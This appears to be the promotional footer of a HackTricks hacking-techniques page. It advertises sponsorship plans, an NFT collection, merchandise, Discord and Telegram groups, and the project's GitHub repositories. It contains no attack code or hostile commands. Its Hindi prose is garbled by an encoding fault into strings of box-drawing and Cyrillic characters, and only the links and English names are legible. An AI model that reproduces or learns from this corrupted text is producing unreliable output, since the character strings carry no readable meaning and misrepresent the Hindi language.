* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
